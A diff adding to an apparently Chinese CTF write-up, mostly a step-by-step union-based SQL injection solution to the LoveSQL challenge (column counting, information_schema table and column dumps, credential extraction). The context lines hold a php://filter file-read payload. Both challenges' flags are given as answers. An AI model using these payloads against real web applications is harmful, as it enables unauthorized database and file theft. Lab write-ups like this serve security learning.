@@ -234,6 +234,55 @@ F12查看隐藏文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/3
 
 **构造PHP伪协议：**<br />`**php://filter/read=convert.base64-encode/resource=flag.php**`<br />**最终payload：**<br />`**URL/?file=php://filter/read=convert.base64-encode/resource=flag.php**`<br />**回显结果：**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698806980194-49f87555-3a9c-43cd-964d-822c6c6d0102.png#averageHue=%23fbfafa&clientId=u6aca6dec-195b-4&from=paste&height=408&id=u02767e88&originHeight=510&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=63379&status=done&style=none&taskId=u44a45d63-b891-4d3f-a9bd-a898ef7ecd8&title=&width=1536)<br />可以看到是明显的base64编码格式<br />放到Kali进行base64解码<br />`echo "PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZTI0OTJhMTktZDhjYi00OGYzLWIwOTctYjM0OGQyNjEwZmExfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=" | base64 -d`<br />回显结果：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698807140717-f0a0d0ce-9537-4a04-b06a-ba572356ed13.png#averageHue=%23202229&clientId=u6aca6dec-195b-4&from=paste&height=724&id=u766689ae&originHeight=905&originWidth=1661&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=248164&status=done&style=none&taskId=ufc308ba6-a62a-4a11-9b2b-42be83496e7&title=&width=1328.8)<br />**得出flag：**<br />`flag{e2492a19-d8cb-48f3-b097-b348d2610fa1}`
 
+## [极客大挑战 2019]LoveSQL 1
+
+题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698909690636-861c392b-5073-4df5-8a76-4449c01db1c6.png#averageHue=%231f1f1f&clientId=u93f0fa3e-5d73-4&from=paste&height=825&id=u10ec8acf&originHeight=1031&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=597645&status=done&style=none&taskId=u8621b856-cfb9-441c-aba3-1d48365d194&title=&width=1534.4)判断注入类型<br />是否为数字型注入
+> `admin`
+> `1`
+
+回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698909822674-6098ec0a-53be-4f1d-b49f-b46bf99dbf72.png#averageHue=%23241e1e&clientId=u93f0fa3e-5d73-4&from=paste&height=833&id=ufde74f60&originHeight=1041&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=606286&status=done&style=none&taskId=u3a7a0892-3a22-4e00-a2e6-e1c476a1cf5&title=&width=1536)
+> 否
+
+是否为字符型注入
+> `admin`
+> `1'`
+
+回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698909907759-b0b66239-ffcf-4a5e-a80c-4134772788ab.png#averageHue=%231d1d1d&clientId=u93f0fa3e-5d73-4&from=paste&height=826&id=ua7cdc6f2&originHeight=1032&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=608102&status=done&style=none&taskId=ue4086c16-4114-4e3d-b8f4-f18afffe7de&title=&width=1536)
+> 是
+
+> 使用堆叠注入
+> 采用密码参数进行注入
+
+爆数据库<br />`1'; show database();#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698910081201-ec66c41b-491a-4f7f-956f-41c24cf17780.png#averageHue=%231f1f1f&clientId=u93f0fa3e-5d73-4&from=paste&height=833&id=u6cca4a46&originHeight=1041&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=609596&status=done&style=none&taskId=ubd1cc3e5-f6c7-4fc9-9899-da9eb316751&title=&width=1536)
+> 这里猜测注入语句某字段被过滤，或者是';'被过滤导致不能堆叠注入
+
+爆字段数<br />`1';order by 4#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698910291949-9d34bc6b-f088-43dd-ae34-9cb3d98a6e41.png#averageHue=%231e1e1e&clientId=u93f0fa3e-5d73-4&from=paste&height=828&id=ue653c0b2&originHeight=1035&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=609461&status=done&style=none&taskId=u014c81be-9a36-4a0c-91c0-a33f4b83262&title=&width=1536)
+> 报错
+> 抛弃堆叠注入
+
+**步入正题**<br />`1' order by 4#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698910383188-ae75dce9-d7c8-4dd4-b815-71fb6ba05d21.png#averageHue=%231e1e1d&clientId=u93f0fa3e-5d73-4&from=paste&height=830&id=u5a0a5819&originHeight=1037&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=600087&status=done&style=none&taskId=u58510ae9-b899-4664-bbc6-cd4a4a0d405&title=&width=1536)
+> 成功，但是不存在第4列
+> 同时验证了猜想不能使用堆叠注入
+
+继续判断列数<br />`1' order by 3#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698910478755-1e7e63c9-0354-45a3-abc2-2f6f535e0003.png#averageHue=%23221c1c&clientId=u93f0fa3e-5d73-4&from=paste&height=826&id=u0c2aade0&originHeight=1033&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=605355&status=done&style=none&taskId=ue936570e-9310-42eb-9dbc-a98cbc98a60&title=&width=1536)
+> 可知列数只有3列
+
+爆数据库<br />使用联合查询<br />`1' union select 1,2,database()#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698910666459-6a3a6b11-fa82-4b48-ad00-31c05b76c161.png#averageHue=%231f1e1e&clientId=u93f0fa3e-5d73-4&from=paste&height=831&id=u731be2bc&originHeight=1039&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=617140&status=done&style=none&taskId=u91b4f4eb-e65b-471e-a60a-1c63c12e91d&title=&width=1536)<br />爆数据表<br />`1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698911070730-12c0a4b1-543d-46c5-9f8b-3b8623ab9df2.png#averageHue=%231e1e1d&clientId=u93f0fa3e-5d73-4&from=paste&height=829&id=u7b0fd8e4&originHeight=1036&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=623639&status=done&style=none&taskId=udc09894c-f0b0-4554-92c7-b9b241f8f57&title=&width=1536)
+> 爆出两个表
+> 开始爆数据表的字段
+> 按照先后顺序把，先爆第一个
+
+爆geekuser数据表的字段<br />`1' union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='geekuser'#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698911854728-50b4b69b-1a11-4896-b284-af320e648a7e.png#averageHue=%23201f1f&clientId=u93f0fa3e-5d73-4&from=paste&height=833&id=u295cb7ff&originHeight=1041&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=613173&status=done&style=none&taskId=udcf4212e-cce5-446d-8c80-c0856916610&title=&width=1536)
+> 字段：id、username、password
+
+爆geekuser数据表的所有内容<br />`1' union select 1,database(),group_concat(id,username,password) from geekuser#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698912168291-6e041779-91e5-4a60-a71c-6234905cdde4.png#averageHue=%23201f1f&clientId=u93f0fa3e-5d73-4&from=paste&height=834&id=u67d2e3eb&originHeight=1042&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=618210&status=done&style=none&taskId=u69c75f31-d772-4757-b782-116847fb745&title=&width=1536)
+> 无flag
+
+转手数据表l0ve1ysq1<br />步骤和数据表geekuser一样，这里直接爆数据表l0ve1ysq1的flag值<br />`1' union select 1,database(),group_concat(password) from l0ve1ysq1#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698912423460-3c81bdee-fb79-40c6-a33f-77d1ef31e897.png#averageHue=%23242322&clientId=u93f0fa3e-5d73-4&from=paste&height=828&id=u6276eb70&originHeight=1035&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=630684&status=done&style=none&taskId=uad685c97-2037-4584-b5df-0a79cd79221&title=&width=1536)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698912445735-b36fc7d2-cb85-49a3-a1bf-e1d6f21d01e5.png#averageHue=%23222222&clientId=u93f0fa3e-5d73-4&from=paste&height=826&id=u20939a6e&originHeight=1033&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=613901&status=done&style=none&taskId=ua38fbf35-d9a8-422a-b92e-f8170c73537&title=&width=1536)<br />**得出flag：**<br />`flag{3c4b1ff9-6685-4dcb-853e-06093c1e4040}`
+
+
+
+
 
 
 
